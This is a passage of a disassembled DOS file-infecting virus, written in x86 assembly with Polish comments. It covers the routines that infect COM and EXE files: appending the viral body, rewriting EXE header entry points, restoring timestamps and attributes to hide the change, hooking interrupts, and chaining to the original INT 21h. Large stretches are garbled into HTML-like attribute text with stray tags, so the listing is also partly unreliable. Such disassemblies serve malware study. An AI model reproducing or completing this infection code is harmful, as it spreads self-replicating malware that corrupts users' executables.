        MOV     ES,AX           ;nowy blok pamieci              ;961B 8E C0
        XOR     SI,SI                                           ;961D 33 F6
        MOV     DI,SI                                           ;961F 8B FE
        MOV     CX,OFFSET L065F                                 ;9621 B9 5F 06
        REPZ    MOVSB           ;przepisanie do bufora          ;9624 F3 A4

        MOV     DX,DI           ;pierwsze wolne miejsce         ;9626 8B D7
        MOV     CX,L0011        ;dlugosc programu oryginalna    ;9628 8B 0E 11 00
        MOV     BX,L0070        ;File handle                    ;962C 8B 1E 70 00
        PUSH    ES                                              ;9630 06
        POP     DS                                              ;9631 1F
        MOV     AH,3FH          ;Read Handle                    ;9632 B4 3F
        INT     21H                                             ;9634 CD 21
L9636:  JB      L9657                                           ;9636 72 1F
        ADD     DI,CX           ;na poczatek zbioru             ;9638 03 F9
        XOR     CX,CX                                           ;963A 33 C9
        MOV     DX,CX                                           ;963C 8B D1
        MOV     AX,4200h        ;Move file ptr BOF+offs         ;963E B8 00 42
        INT     21H                                             ;9641 CD 21
        MOV     SI,OFFSET L0005 ;dopisanie ogonka               ;9643 BE 05 00
        MOV     CX,5                                            ;9646 B9 05 00
        PUSH    DS                                              ;9649 1E
        PUSH    CS                                              ;964A 0E
        POP     DS                                              ;964B 1F
        REPZ    MOVSB                                           ;964C F3 A4
        POP     DS                                              ;964E 1F
        MOV     CX,DI           ;nowa dlugosc programu          ;964F 8B CF
        XOR     DX,DX           ;bufor z wynikowym programem    ;9651 33 D2
        MOV     AH,40H          ;Write Handle                   ;9653 B4 40
        INT     21H                                             ;9655 CD 21
L9657:  JB      L9666                                           ;9657 72 0D
        JMP     L9723                                           ;9659 E9 C7 00

        ;<----- zarazenie="" exe'ca="" l965c:="" mov="" cx,1ch="" ;exe="" file="" header="" -="" dlugosc="" ;965c="" b9="" 1c="" 00="" mov="" dx,offset="" l004f="" ;="" -="" bufor="" ;965f="" ba="" 4f="" 00="" mov="" ah,3fh="" ;read="" handle="" ;9662="" b4="" 3f="" int="" 21h="" ;9664="" cd="" 21="" l9666:="" jb="" l96b2="" ;9666="" 72="" 4a="" mov="" word="" ptr="" l0061,1984h="" ;suma="" kontrolna="" ;9668="" c7="" 06="" 61="" 00="" 84="" 19="" mov="" ax,l005d="" ;ss="" ;966e="" a1="" 5d="" 00="" mov="" l0045,ax="" ;9671="" a3="" 45="" 00="" mov="" ax,l005f="" ;sp="" ;9674="" a1="" 5f="" 00="" mov="" l0043,ax="" ;9677="" a3="" 43="" 00="" mov="" ax,l0063="" ;ip="" ;967a="" a1="" 63="" 00="" mov="" l0047,ax="" ;967d="" a3="" 47="" 00="" mov="" ax,l0065="" ;cs="" ;9680="" a1="" 65="" 00="" mov="" l0049,ax="" ;9683="" a3="" 49="" 00="" mov="" ax,l0053="" ;sile="" size="" -="" pages="" ;9686="" a1="" 53="" 00="" cmp="" word="" ptr="" l0051,0="" ;last="" page="" bytes="" ;9689="" 83="" 3e="" 51="" 00="" 00="" jz="" l9691="" ;968e="" 74="" 01="" dec="" ax="" ;9690="" 48="" l9691:="" mul="" word="" ptr="" l0078="" ;*=""></-----><bytes per="" page="">     ;9691 F7 26 78 00
        ADD     AX,L0051                ;+last page bytes       ;9695 03 06 51 00
        ADC     DX,0                                            ;9699 83 D2 00
        ADD     AX,0Fh                  ;zaokraglenie           ;969C 05 0F 00
        ADC     DX,0                                            ;969F 83 D2 00
        AND     AX,0FFF0h                                       ;96A2 25 F0 FF
        MOV     L007C,AX                                        ;96A5 A3 7C 00
        MOV     L007E,DX                                        ;96A8 89 16 7E 00
        ADD     AX,OFFSET L0664         ;dlugosc z sygnatura    ;96AC 05 64 06
        ADC     DX,0                                            ;96AF 83 D2 00
L96B2:  JB      L96EE                                           ;96B2 72 3A
        DIV     WORD PTR L0078          ;bytes per page         ;96B4 F7 36 78 00
        OR      DX,DX                   ;czy jest reszta ?      ;96B8 0B D2
        JZ      L96BD                   ;-> nie                 ;96BA 74 01
        INC     AX                      ;<- jest="" reszta="" ;96bc="" 40="" l96bd:="" mov="" l0053,ax="" ;pages="" per="" file="" ;96bd="" a3="" 53="" 00="" mov="" l0051,dx="" ;last="" page="" bytes="" ;96c0="" 89="" 16="" 51="" 00="" mov="" ax,l007c="" ;nowa="" dlugosc="" calosci="" ;96c4="" a1="" 7c="" 00="" mov="" dx,l007e="" ;96c7="" 8b="" 16="" 7e="" 00="" div="" word="" ptr="" l007a="" ;na="" paragrafy="" ;96cb="" f7="" 36="" 7a="" 00="" sub="" ax,l0057="" ;header="" size="" ;96cf="" 2b="" 06="" 57="" 00="" mov="" l0065,ax="" ;cs="" wirusa="" ;96d3="" a3="" 65="" 00="" mov="" word="" ptr="" l0063,offset="" l00c4="" ;ip="" wirusa="" ;96d6="" c7="" 06="" 63="" 00="" c4="" 00="" mov="" l005d,ax="" ;ss="" wirusa="" ;96dc="" a3="" 5d="" 00="" mov="" word="" ptr="" l005f,offset="" l065d="" ;sp="" wirusa="" ;96df="" c7="" 06="" 5f="" 00="" 5d="" 06="" xor="" cx,cx="" ;96e5="" 33="" c9="" mov="" dx,cx="" ;96e7="" 8b="" d1="" mov="" ax,4200h="" ;move="" file="" ptr="" bof+offs="" ;96e9="" b8="" 00="" 42="" int="" 21h="" ;96ec="" cd="" 21="" l96ee:="" jb="" l96fa="" ;96ee="" 72="" 0a="" mov="" cx,1ch="" ;zapis="" zmodyf.="" headera="" ;96f0="" b9="" 1c="" 00="" mov="" dx,offset="" l004f="" ;96f3="" ba="" 4f="" 00="" mov="" ah,40h="" ;write="" handle="" ;96f6="" b4="" 40="" int="" 21h="" ;96f8="" cd="" 21="" l96fa:="" jb="" l970d="" ;96fa="" 72="" 11="" cmp="" ax,cx="" ;96fc="" 3b="" c1="" jnz="" l9723="" ;-=""> nie cale poszlo     ;96FE 75 23
        MOV     DX,L007C                ;nowa dlugosc zbioru    ;9700 8B 16 7C 00
        MOV     CX,L007E                                        ;9704 8B 0E 7E 00
        MOV     AX,4200h                ;Move file ptr BOF+offs ;9708 B8 00 42
        INT     21H                                             ;970B CD 21
L970D:  JB      L9723                                           ;970D 72 14
        XOR     DX,DX                                           ;970F 33 D2
        MOV     CX,065Fh                                        ;9711 B9 5F 06
        MOV     AH,40H                  ;Write Handle           ;9714 B4 40
        INT     21H                                             ;9716 CD 21
        MOV     CX,5                                            ;9718 B9 05 00
        LEA     DX,L0005                                        ;971B 8D 16 05 00
        MOV     AH,40H                  ;Write Handle           ;971F B4 40
        INT     21H                                             ;9721 CD 21

        ;<----- wspolny="" koniec="" l9723:="" cmp="" word="" ptr="" cs:l008f,0="" ;znacznik="" zajecia="" bloku="" ;9723="" 2e="" 83="" 3e="" 8f="" 00="" 00="" jz="" l972f="" ;9729="" 74="" 04="" mov="" ah,49h="" ;free="" allocated="" memory="" ;972b="" b4="" 49="" int="" 21h="" ;972d="" cd="" 21="" l972f:="" cmp="" word="" ptr="" cs:l0070,-1="" ;file="" handle="" ;972f="" 2e="" 83="" 3e="" 70="" 00="" ff="" jz="" l9768="" ;-=""> nie otwarty         ;9735 74 31
        MOV     BX,CS:L0070             ;File handle            ;9737 2E 8B 1E 70 00
        MOV     DX,CS:L0074                                     ;973C 2E 8B 16 74 00
        MOV     CX,CS:L0076                                     ;9741 2E 8B 0E 76 00
        MOV     AX,5701h                ;Set File Time/Date     ;9746 B8 01 57
        INT     21H                                             ;9749 CD 21
        MOV     AH,3EH                  ;Close Handle           ;974B B4 3E
        INT     21H                                             ;974D CD 21
        PUSH    CS                                              ;974F 0E
        POP     DS                                              ;9750 1F
        LDS     DX,DWORD PTR L0080      ;ptr nazwy zbioru       ;9751 C5 16 80 00
        MOV     CX,CS:L0072             ;atry zarazanego zbioru ;9755 2E 8B 0E 72 00
        MOV     AX,4301h                ;Set File Attributes    ;975A B8 01 43
        INT     21H                                             ;975D CD 21
        LEA     DX,L001B                                        ;975F 8D 16 1B 00
        MOV     AX,2524h                ;Set int 24h vector     ;9763 B8 24 25
        INT     21H                                             ;9766 CD 21
L9768:  POP     ES                                              ;9768 07
        POP     DS                                              ;9769 1F
        POP     DI                                              ;976A 5F
        POP     SI                                              ;976B 5E
        POP     DX                                              ;976C 5A
        POP     CX                                              ;976D 59
        POP     BX                                              ;976E 5B
        POP     AX                                              ;976F 58
        POPF                                                    ;9770 9D
        JMP     DWORD PTR CS:L0017      ;old int 21h            ;9771 2E FF 2E 17 00

L05F6   dw      03FCh           ;<- adres="" wektora="" int="" ff="" ;9776="" fc="" 03="" dw="" 0="" ;9778="" 00="" 00=""></-><------ stos="" db="" 0="" ;977a="" 00="" dw="" 0="" ;977b="" 00="" 00="" dw="" 0="" ;977d="" 00="" 00="" dw="" 0="" ;977f="" 00="" 00="" dw="" 0="" ;9781="" 00="" 00="" dw="" 0="" ;9783="" 00="" 00="" dw="" 0="" ;9785="" 00="" 00="" dw="" 0="" ;9787="" 00="" 00="" dw="" 0="" ;9789="" 00="" 00="" dw="" 0="" ;978b="" 00="" 00="" dw="" 0="" ;978d="" 00="" 00="" dw="" 0="" ;978f="" 00="" 00="" dw="" 0="" ;9791="" 00="" 00="" dw="" 0="" ;9793="" 00="" 00="" dw="" 0="" ;9795="" 00="" 00="" dw="" 0="" ;9797="" 00="" 00="" dw="" 0="" ;9799="" 00="" 00="" dw="" 0="" ;979b="" 00="" 00="" dw="" 0="" ;979d="" 00="" 00="" dw="" 0="" ;979f="" 00="" 00="" dw="" 0="" ;97a1="" 00="" 00="" dw="" 0="" ;97a3="" 00="" 00="" dw="" 0="" ;97a5="" 00="" 00="" dw="" 0="" ;97a7="" 00="" 00="" dw="" 156ch="" ;97a9="" 6c="" 15="" dw="" 1261h="" ;97ab="" 61="" 12="" dw="" 2524h="" ;97ad="" 24="" 25="" dw="" 0005h="" ;97af="" 05="" 00="" dw="" 0020h="" ;97b1="" 20="" 00="" dw="" 04ebh="" ;97b3="" eb="" 04="" dw="" 0006h="" ;97b5="" 06="" 00="" dw="" 156ch="" ;97b7="" 6c="" 15="" dw="" 2508h="" ;97b9="" 08="" 25="" dw="" 0fea5h="" ;97bb="" a5="" fe="" dw="" 07bch="" ;97bd="" bc="" 07="" dw="" 0216h="" ;97bf="" 16="" 02="" dw="" 065eh="" ;97c1="" 5e="" 06="" dw="" 156ch="" ;97c3="" 6c="" 15="" dw="" 0c89h="" ;97c5="" 89="" 0c="" dw="" 012fh="" ;97c7="" 2f="" 01="" dw="" 7f04h="" ;97c9="" 04="" 7f="" dw="" 0075h="" ;97cb="" 75="" 00="" dw="" 065eh="" ;97cd="" 5e="" 06="" dw="" 5a1dh="" ;97cf="" 1d="" 5a="" dw="" 0="" ;97d1="" 00="" 00="" dw="" 9301h="" ;97d3="" 01="" 93="" dw="" 0ba6h="" ;97d5="" a6="" 0b="" dw="" 0213h="" ;97d7="" 13="" 02="" dw="" 0c89h="" ;97d9="" 89="" 0c="" dw="" 0f202h="" ;97db="" 02="" f2="" l065d="" dw="" 2700h="" ;szczyt="" stosu="" ;97dd="" 00="" 27="" l065f="" db="" 0c8h,0f7h,0e1h,0eeh,0e7h="" ;97df="" c8="" f7="" e1="" ee="" e7="" l0664="" label="" byte="" s9180="" ends="" end="" l9244=""></------></-----></-></bytes></-----></-></bytes></avl></sec></-></-></-></-></->